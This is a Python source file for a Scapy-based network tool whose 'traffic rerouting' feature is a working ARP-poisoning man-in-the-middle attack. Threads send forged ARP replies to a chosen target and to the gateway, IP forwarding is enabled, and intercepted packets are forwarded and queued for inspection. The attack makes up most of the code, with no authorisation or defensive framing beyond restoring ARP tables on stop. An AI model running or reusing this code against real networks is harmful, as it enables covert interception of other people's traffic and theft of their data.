import os
import getpass
import netifaces
import logging
import subprocess  # For subprocess.run()
import threading  # For threading.Thread and threading.Lock
import time  # For time.sleep()
import errno  # For errno (used for error checking in threads)

from scapy.all import *  #  Import all of Scapy
from scapy.all import IP, Ether
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from textcolors import TextColors
from queue import Queue, Empty

logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class Tool:

    def __init__(self, interface=None, greet=False, use_scapy_forwarding=False):
        self.console = Console()
        self._interface = interface
        self.greet = greet
        self.use_scapy_forwarding = use_scapy_forwarding
        self.stop_event = threading.Event()  # Crucial: make sure it's in __init__
        self.poison_threads_lock = threading.Lock()  # Add lock
        self.forwarding_thread = None  # Initialize forwarding thread
        self.packet_queue = Queue()  # Initialize packet queue
        self.packet_queue_lock = threading.Lock()  # <--  Must be initialized here

        # Initialize network info immediately
        self.initialize()

        if (
            greet and self.is_network_info_available()
        ):  # Greet only if initialization was successful
            self.greet_user()

    def initialize(self):
        """Retrieves and stores network information."""
        try:
            self._interface = self._get_default_interface()
            if self._interface is None:
                raise RuntimeError(
                    "No suitable network interface found."
                )  # Raise exception to be caught

            self._gateway_ip = self._get_default_gateway()
            self._own_ip = self._get_own_ip()
            self._own_mac = self._get_own_mac()

            if not all([self._gateway_ip, self._own_ip, self._own_mac]):
                logger.warning(
                    "Some network information could not be retrieved."
                )  # Consistent Logging
        except (
            KeyError,
            IndexError,
            ValueError,
            OSError,
            AttributeError,
            RuntimeError,  # Catch the potential RuntimeError
        ) as e:
            self.console.print(
                f"{TextColors.FAIL}Error during initialization: {e}{TextColors.ENDC}",
                style="bold red",
            )
            # Clear network info on failure
            self._interface = None
            self._gateway_ip = None
            self._own_ip = None
            self._own_mac = None

    def greet_user(self):
        """Presents a colorful greeting to the user, including network info."""
        username = getpass.getuser()
        greeting_table = Table(title=f"Welcome, {username}!", style="bold cyan")
        greeting_table.add_row("Network Tool Initialized")
        greeting_table.add_row(
            f"Interface: {self._interface or 'N/A'}"
        )  # Shows N/A if not available
        greeting_table.add_row(f"Gateway IP: {self._gateway_ip or 'N/A'}")
        greeting_table.add_row(f"Own IP: {self._own_ip or 'N/A'}")
        greeting_table.add_row(f"Own MAC: {self._own_mac or 'N/A'}")

        self.console.print(Panel(greeting_table, border_style="green", expand=False))

    def is_network_info_available(self):
        """Checks if all required network information is available."""
        return all([self._interface, self._gateway_ip, self._own_ip, self._own_mac])

    def _get_default_interface(self):  # Same logic but better error reporting
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][1]
        except KeyError:
            logger.error("No default gateway found.")  # Logging
            return None

    def _get_default_gateway(self):  # Same logic, improved logging
        try:
            gws = netifaces.gateways()
            return gws["default"][netifaces.AF_INET][0]
        except KeyError:
            logger.error("No default gateway found.")  # Logging
            return None

    def _get_own_ip(self):  # Improve error handling logic
        try:
            ifaddresses = netifaces.ifaddresses(self._interface)
            if netifaces.AF_INET in ifaddresses:
                return ifaddresses[netifaces.AF_INET][0]["addr"]
            else:
                logger.error(f"No IPv4 address found for interface: {self._interface}")
                return None

        except ValueError as e:
            logger.error(f"Invalid interface specified: {e}")  # Better Logging
            return None

    def _get_own_mac(self):  # Logging error with more information
        try:
            return get_if_hwaddr(self._interface)
        except OSError as e:
            logger.error(
                f"Error getting MAC address for {self._interface}: {e}"
            )  # Log useful details
            return None

    # ... (Getter methods)
    def get_interface(self):
        return self._interface

    def get_gateway_ip(self):
        return self._gateway_ip

    def get_own_ip(self):
        return self._own_ip

    def get_own_mac(self):
        return self._own_mac

    #       Traffic rerouting logic
    #######

    def _get_mac(self, ip_address):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
                timeout=2,
                verbose=0,
            )
            if ans:
                return ans[0][1].hwsrc
            else:
                logger.error(f"Failed to resolve MAC address for {ip_address}")
                return None
        except Exception as e:
            logger.error(f"Error getting MAC address: {e}")
            return None

    def _restore_arp(self):
        if (
            self.target_ip
            and self._gateway_ip  # Use the class's stored gateway IP
            and self.target_mac
            and self.gateway_mac
            and self._interface
        ):  # Check if all needed vars are defined
            try:
                send(
                    ARP(
                        op=2,
                        pdst=self._gateway_ip,  # _gateway_ip
                        hwdst=self.gateway_mac,
                        psrc=self.target_ip,
                        hwsrc=self.target_mac,
                    ),
                    count=5,
                    verbose=0,
                )
                send(
                    ARP(
                        op=2,
                        pdst=self.target_ip,
                        hwdst=self.target_mac,
                        psrc=self._gateway_ip,  # _gateway_ip
                        hwsrc=self.gateway_mac,
                    ),
                    count=5,
                    verbose=0,
                )
                logger.info("ARP table restored.")
            except Exception as e:
                logger.error(f"Error restoring ARP: {e}")
        else:
            missing = []
            if not self.target_ip:
                missing.append("target_ip")
            if not self._gateway_ip:
                missing.append("_gateway_ip")
            if not self.target_mac:
                missing.append("target_mac")
            if not self.gateway_mac:
                missing.append("gateway_mac")
            if not self._interface:
                missing.append("_interface")

            logger.warning("Could not restore ARP table. Information missing.")

    def start_rerouting(self, target_ip):

        if (
            not self.is_network_info_available()
        ):  # Do this check here, before acquiring the lock.
            raise RuntimeError(
                "Network information not available. Initialize the tool first."
            )

        with self.poison_threads_lock:  # Use lock here to prevent race conditions when accessing/modifying these shared variables:
            self.poison_threads = []  # Clear poison_threads (thread safety)
            self.target_ip = target_ip  # Store target IP (used in other methods)
            self.target_mac = self._get_mac(target_ip)
            self.gateway_mac = self._get_mac(self._gateway_ip)

            if (
                not self.target_mac or not self.gateway_mac
            ):  # Check if MAC addresses resolved.  Do this inside the lock
                message = "Failed to resolve MAC address"
                if not self.target_mac:
                    message += f" for target IP: {target_ip}"
                if not self.gateway_mac:
                    if not self.target_mac:  # Add "and" for better message formatting
                        message += (
                            " and"  # Corrected to include 'and' for multiple errors
                        )
                    message += f" for gateway IP: {self._gateway_ip}"

                raise ValueError(message)  # Raise exception if MAC couldn't be resolved

        try:

            if self.forwarding_thread and self.forwarding_thread.is_alive():

                self.stop_event.set()
                self.forwarding_thread.join()
                self.forwarding_thread = None
                logger.info("Stopped previous Scapy forwarding thread.")

            elif not self.use_scapy_forwarding:

                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True)
                logger.info("Disabled existing system IP forwarding.")

            if self.use_scapy_forwarding:
                self.forwarding_thread = threading.Thread(
                    target=self._scapy_forwarding_loop,  # Make sure the correct method name is used!
                    args=(
                        target_ip,
                        self.target_mac,
                        self._gateway_ip,
                        self.gateway_mac,
                    ),
                    daemon=True,
                )

                self.forwarding_thread.start()  # Start forwarding thread

                logger.info("Using Scapy IP forwarding")

            elif not self.use_scapy_forwarding:  # Using system IP forwarding:

                subprocess.run(
                    ["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True
                )  # enable IP forwarding if using sysctl

                logger.info("Using sysctl IP forwarding")

            # ---  ARP Poisoning Threads ---
            with self.poison_threads_lock:  # Correct locking is essential
                self.poison_threads = [  # corrected placement - inside with block
                    threading.Thread(
                        target=self._poison_thread,
                        args=(
                            self.target_ip,
                            self.target_mac,
                            self._gateway_ip,
                        ),  #  Use self._gateway_ip
                        daemon=True,
                    ),
                    threading.Thread(
                        target=self._poison_thread,
                        args=(self._gateway_ip, self.gateway_mac, self.target_ip),
                        daemon=True,
                    ),
                ]
                for thread in self.poison_threads:  # Start threads while holding lock
                    thread.start()  # Corrected placement - start inside the with block

            logger.info(f"Started rerouting traffic for {target_ip}")

        except Exception as e:
            with self.poison_threads_lock:  # MUST acquire the lock during exception handling and cleanup
                if (
                    self.poison_threads
                ):  # Check if any threads were started to avoid error.
                    self.stop_event.set()  # Ensure the threads stop
                    for thread in self.poison_threads:
                        thread.join()
                    self.poison_threads = []  # Clear after joining
                self._restore_arp()  # Restore ARP if something went wrong

            if (
                self.use_scapy_forwarding and self.forwarding_thread
            ):  # Check if forwarding thread was started.
                self.stop_event.set()  # Stop forwarding thread
                self.forwarding_thread.join()  # Wait for it to stop
                self.forwarding_thread = None  # Reset forwarding thread after stopping

            logger.exception(f"Error during rerouting setup: {e}")
            raise  # Re-raise after cleanup

    def _poison_thread(self, target_ip, target_mac, source_ip):

        poison_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)

        max_retries = 3
        retries = 0

        while True:  # More robust loop
            try:
                if self.stop_event.is_set():  # Check stop event within try block.
                    break  # Exit gracefully if stop_event is set

                send(poison_packet, verbose=0)
                time.sleep(2)
                retries = 0  # Reset on success

            except OSError as e:
                retries += 1
                if e.errno == errno.ENETDOWN:  # Network is down.
                    logger.error(f"Network interface down: {e}")
                    break  # Exit thread on network down.

                else:
                    logger.error(
                        f"Error sending ARP packet (Retry {retries}/{max_retries}): {e}"
                    )
                    if retries >= max_retries:
                        logger.error("Max retries reached. Exiting poisoning thread.")
                        break  # Exit after max retries

                    time.sleep(1)  # Wait before retrying

            except Exception as e:  # Catch and log any other unexpected exceptions.
                logger.exception(
                    f"Unexpected error in poisoning thread: {e}"
                )  # More descriptive logging

                break  # Exit on any other error.

    def stop_rerouting(self):

        with self.poison_threads_lock:  # Must acquire the lock when potentially accessing self.poison_threads
            if self.poison_threads:  # Check if the threads were ever started.

                self.stop_event.set()  # Signal threads to stop
                for thread in self.poison_threads:
                    thread.join()  # Wait for threads to finish

                self._restore_arp()  # Existing code.

                if (
                    not self.use_scapy_forwarding
                ):  # Stop forwarding only if scapy forwarding is being used.
                    subprocess.run(
                        ["sysctl", "-w", "net.ipv4.ip_forward=0"], check=True
                    )  # Disable IP forwarding

                logger.info("Traffic rerouting stopped and ARP table restored.")
                self.poison_threads = []  # Clear the list (thread safety)
                self.stop_event.clear()  # Reset the stop event
            else:  # No active threads
                logger.warning(
                    "Rerouting stop attempted, but no threads were active. Was start_rerouting called successfully?"
                )

        if (
            self.use_scapy_forwarding
        ):  # Only stop scapy forwarding thread if we are using scapy forwarding.

            if (
                self.forwarding_thread
            ):  # Check if it exists first. Might not due to exceptions in start_rerouting.

                self.stop_event.set()  # Make sure thread has stopped before exiting.
                if (
                    self.forwarding_thread.is_alive()
                ):  # Thread may not have been started due to error in start_rerouting.
                    self.forwarding_thread.join()  # Must give the forwarding thread a moment to stop gracefully

            self.forwarding_thread = None  # Reset forwarding thread after stopping.
            logger.info("Stopped Scapy forwarding thread.")  # Clear logging message

    def _scapy_forwarding_loop(self, target_ip, target_mac, gateway_ip, gateway_mac):
        try:
            with conf.L3socket() as fwd:
                while not self.stop_event.is_set():
                    try:
                        packet = fwd.recv(1024, timeout=1)
                        if packet and IP in packet:

                            if packet[IP].dst == target_ip:  # Use the local copy
                                packet[Ether].dst = target_mac  # Use local copy
                            elif packet[IP].src == target_ip:
                                packet[Ether].dst = gateway_mac
                            elif packet[IP].src == gateway_ip:  # Handle reverse traffic
                                packet[Ether].dst = target_mac
                            elif packet[IP].dst == gateway_ip:
                                packet[Ether].dst = gateway_mac

                            try:  # Handle potential OSError during send
                                fwd.send(packet)

                                self.process_packet(
                                    packet.copy()
                                )  # Enqueue packet for later processing.
                            except OSError as e:
                                logger.error(
                                    f"Error sending packet in forwarding loop: {e}"
                                )

                    except socket.timeout:
                        pass  # Expected; just continue
                    except Exception as e:  # Log and handle
                        logger.exception(f"Error in forwarding loop: {e}")
                        break  # Exit on any error. Let the main thread restart or handle it.
        except Exception as e:  # Log exception
            logger.exception(f"Error creating Scapy forwarding socket: {e}")

    def process_packet(self, packet):
        """Processes a captured packet (stores in queue)."""

        if not packet:
            return  # Handle potential None packet

        try:

            if IP in packet:
                if self.use_scapy_forwarding or (
                    not self.forwarding_thread or not self.forwarding_thread.is_alive()
                ):

                    logger.info(f"Processing packet: {packet.summary()}")

                    if packet[IP].dst == self.target_ip:
                        packet[Ether].dst = self.target_mac
                    elif packet[IP].src == self.target_ip:
                        packet[Ether].dst = self.gateway_mac

                    elif not self.use_scapy_forwarding:  # Using sysctl, not scapy
                        return  # Let the system handle unrelated traffic

                    elif self.use_scapy_forwarding:  # Only for scapy

                        if packet[IP].src == self._gateway_ip:
                            packet[Ether].dst = self.target_mac

                        elif packet[IP].dst == self._gateway_ip:
                            packet[Ether].dst = self.gateway_mac

                    try:
                        sendp(
                            packet, verbose=0, iface=self._interface
                        )  # Use explicit interface

                    except OSError as e:
                        logger.error(f"Error sending packet: {e}")

                else:  # System forwarding is active
                    logger.debug(
                        "System IP forwarding active; skipping Scapy processing."
                    )

            else:  # Handle non-IP packets
                logger.debug(f"Non-IP packet received: {packet.summary()}")
                if (
                    self.use_scapy_forwarding
                ):  # Forward non-ip traffic only when explicitly enabled

                    try:
                        sendp(packet, verbose=0, iface=self._interface)

                        with self.packet_queue_lock:  # Correct:  Protect queue access
                            self.packet_queue.put(packet.copy())
                    except OSError as e:
                        logger.error(f"Error sending packet: {e}")

        except Exception as e:
            logger.exception(f"Error processing packet: {e}")

    def get_packet_from_queue(
        self, block=True, timeout=None
    ):  # Improved with optional timeout
        """Retrieves a packet from the queue.

        Args:
            block: Whether to block if the queue is empty.
            timeout: Timeout in seconds if blocking.
        """

        with self.packet_queue_lock:  # Use the lock when getting from the queue

            try:
                packet = self.packet_queue.get(block=block, timeout=timeout)
                self.packet_queue.task_done()
                return packet

            except Empty:

                return None
